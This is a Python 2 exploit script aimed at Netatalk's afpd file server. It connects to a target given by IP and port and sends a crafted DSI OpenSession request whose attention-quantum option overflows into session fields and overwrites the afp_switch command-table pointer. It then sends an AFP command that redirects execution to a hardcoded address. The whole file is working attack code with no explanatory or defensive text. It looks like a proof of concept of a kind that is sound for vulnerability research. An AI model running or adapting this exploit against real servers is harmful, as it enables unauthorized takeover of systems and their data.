import socket
import struct
import sys
if len(sys.argv) != 3:
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Attempting connection to " + ip + ":" + sys.argv[2]
sock.connect((ip, port))
dsi_payload = "\x00\x00\x40\x00" # client quantum
dsi_payload += '\x00\x00\x00\x00' # overwrites datasize
dsi_payload += struct.pack("I", 0xdeadbeef) # overwrites quantum
dsi_payload += struct.pack("I", 0xfeedface) # overwrites the ids
'''
readelf -Ws /usr/local/sbin/afpd | grep "afp_switch"
   580: 0000000000246220     8 OBJECT  GLOBAL DEFAULT   24 afp_switch
'''
dsi_payload += struct.pack("Q", 0x000055be855c6a20) # overwrite commands ptr
dsi_opensession = "\x01" # attention quantum option
dsi_opensession += struct.pack("B", len(dsi_payload)) # length
dsi_opensession += dsi_payload
dsi_header = "\x00" # "request" flag
dsi_header += "\x04" # open session command
dsi_header += "\x00\x01" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack(">I", len(dsi_opensession))
dsi_header += "\x00\x00\x00\x00" # reserved
dsi_header += dsi_opensession
sock.sendall(dsi_header) 
resp = sock.recv(1024)
print "[+] Open Session complete"
afp_command = "\x01" # invoke the second entry in the table
afp_command += "\x00" # protocol defined padding
afp_command += "\x00\x00\x00\x00\x00\x00" # pad out the first entry
'''
readelf -Ws /usr/local/sbin/afpd | grep "afp_getsrvrinfo"
   552: 000000000002d2f0    53 FUNC    GLOBAL DEFAULT   14 afp_getsrvrinfo
'''
afp_command += struct.pack("Q", 0x55be853af2f0) # address to jump to
dsi_header = "\x00" # "request" flag
dsi_header += "\x02" # "AFP" command
dsi_header += "\x00\x02" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack(">I", len(afp_command))
dsi_header += '\x00\x00\x00\x00' # reserved
dsi_header += afp_command
print "[+] Sending get server info request"
sock.sendall(dsi_header) 
resp = sock.recv(1024)
print resp
print "[+] Fin."